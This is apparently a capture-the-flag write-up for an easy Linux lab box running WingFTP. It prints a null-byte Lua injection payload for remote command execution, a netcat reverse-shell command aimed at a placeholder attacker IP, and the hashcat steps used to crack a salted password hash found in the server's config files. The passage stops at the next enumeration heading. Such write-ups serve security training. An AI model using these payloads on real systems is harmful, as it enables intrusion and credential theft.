<div style="text-align:center">
<img src="screenshots/wingdata.png" width="100">
</div>

- Difficulty: Easy
- OS: Linux
---
# Tools
- Nmap
- python
- ssh
- BurpSuite
- hashcat
---
# Attack Path
- Enumerate open ports
- Information Gathering
- Command Injection
- Gaining a reverse shell
- Linux enumeration
- Wacky user enumeration
--- 
# Port enumeration
To find open ports I used nmap with the flags -sS for a SYN scan, -F for a fast scan and -A to enable OS and service version detection.

<div style="text-align:center">
<img src="screenshots/nmap.png">
</div>

we can see that the 80 port is open which is associated with the http protocol.

---
# Information gathering

<img src="screenshots/http_page.png">

Once in the page we can see that the server provides file management solutions and if we try access the client portal section we can see a new subdomain.

<img src="screenshots/ftp_domain.png">

I add the new domain to /etc/hosts and access the client portal, where I can found a login page but we can't create a new user, fortunately the login page disclosures the version of WingFTP.

<img src="screenshots/login.png">

searching the web for potential vulnerabilities i found the [CVE-2025-47812](https://nvd.nist.gov/vuln/detail/CVE-2025-47812).

---
# Exploitation
## Techniques
- [Embedding Null Code](https://owasp.org/www-community/attacks/Embedding_Null_Code)
- [Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
## Vulnerability Analysis

The login functionality was implemented using Lua scripts that interacted with native backend functions.  
The application improperly handled NULL (`\0`) bytes inside user-controlled input.

By injecting a NULL byte followed by `">`, it was possible to terminate an internal Lua multiline string and inject arbitrary Lua code.

The payload used:

```txt
username=anonymous%00">
local h = io.popen("id")
local r = h:read("*a")
h:close()
print(r)
--
```

worked because:
1. The backend authentication logic truncated the username at the NULL byte.
2. The Lua parser continued processing the remaining content.    
3. `">` terminated an internal Lua multiline string.    
4. Arbitrary Lua statements were then executed.    
5. `io.popen()` was used to execute system commands and capture their output.    

This resulted in remote code execution as the web service user.
<div style="text-align:center">
<img src="screenshots/zap_proxy.png">
</div>

we can see that the payload works and retrieves the command output

<img src="screenshots/injection_success.png">

## Gaining a revshell
For gain a revshell I used the next payload
```bash
nc -c sh [Attacker IP] [PORT]
```
And opened a listener in the attacker machine

<img src="screenshots/revshell.png">

---
## Linux Enumeration
I confirmed that the OS was linux using the command `cat /etc/os-release`

<img src="screenshots/OS.png">

As I logon as the web server user "wingdata" i don't have many possibilities to escalate privileges from my position so i try search for valid user to make a lateral movement.
First check the passwd file to find valid users.

<img src="screenshots/valid_users.png">

Then I search recursively for users credential in the wftpserver files
<img src="screenshots/users.png">

I found a suggested wacky.xml file, so the next step was to read the content and search for useful information. I look put my eyes on the next lines
```xml
<USER_ACCOUNTS Description="Wing FTP Server User Accounts">
    <USER>
        <UserName>wacky</UserName>
        <EnableAccount>1</EnableAccount>
        <EnablePassword>1</EnablePassword>
		<Password>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca</Password>
        <EnableTwoFactor>0</EnableTwoFactor>
        <TwoFactorCode></TwoFactorCode>
        <LastLoginIp>127.0.0.1</LastLoginIp>
        <LastLoginTime>2025-11-02 12:28:52</LastLoginTime>
```


Here we have a hash password and we can see there is no 2FA, then I search for server configuration to gather information about how the hashes are generated to find a possible salt and determine the hash algorithm.

<img src="screenshots/setting_files.png">

Since the users were on the /Data/1/ directory i first check the settings file on that directory and I found the next information.

```xml
    <Min_Password_Length>0</Min_Password_Length>
    <Password_Have_Numerals>0</Password_Have_Numerals>
    <Password_Have_Lowercase>0</Password_Have_Lowercase>
    <Password_Have_Uppercase>0</Password_Have_Uppercase>
    <Password_Have_Nonalphanumeric>0</Password_Have_Nonalphanumeric>
    <EnableSHA256>1</EnableSHA256>
    <EnablePasswordSalting>1</EnablePasswordSalting>
    <SaltingString>WingFTP</SaltingString>
```
The configuration file revealed that passwords were hashed using SHA256 with salting enabled and a static salt value of `WingFTP`.

Using this information, I copied the hash value and salt and cracked the credentials using Hashcat mode 1410 (SHA256 with salt).

``` bash
➜  WingData hashcat -m 1410 hash /usr/share/wordlists/rockyou.txt
```
In this way I can found the wacky password and used it to change my user.

<img src="screenshots/wacky.png">

---
## Wacky user enumeration
